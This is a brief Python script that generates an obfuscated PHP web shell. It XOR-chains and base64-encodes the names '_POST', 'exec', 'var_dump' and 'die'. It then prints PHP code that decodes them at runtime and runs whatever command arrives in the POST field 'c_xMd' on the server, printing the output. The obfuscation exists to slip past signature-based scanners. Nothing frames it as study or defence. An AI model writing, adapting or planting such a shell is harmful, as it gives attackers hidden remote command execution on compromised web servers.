#!/usr/bin/python3

import base64
import random

implode = base64.b64encode("implode".encode('ascii'))


text = ["_POST", "c_xMd", "exec", "die", "var_dump"] 

arr = []
for m in text:
	arr.append(len(m))
	for c in m:
		arr.append(ord(c))
			
startXor = random.randint(20, 255)

encoded = [0] * len(arr)
encoded[0] = arr[0] ^ startXor

for j in range(1, len(arr)):
	encoded[j] = arr[j] ^ encoded[j-1]

		
print('$k=base64_decode("' + base64.b64encode(bytes(encoded)).decode('ascii') + '");')
print("for($i=0;$i<strlen($k);$i++)$z[]=chr(ord($k[$i])^(($i>0)?ord($k[$i-1]):" + str(startXor) + "));")
print("""for($j=0;$j<count($z);$j+=ord($z[$j])+1)$b[]=array_slice($z, $j+1,ord($z[$j]));
$p=array_map(base64_decode("aW1wbG9kZQ=="),$b);
if(isset(${$p[0]}[$p[1]])){$p[2](${$p[0]}[$p[1]],$o);$p[4]($o);$p[3]();}""")

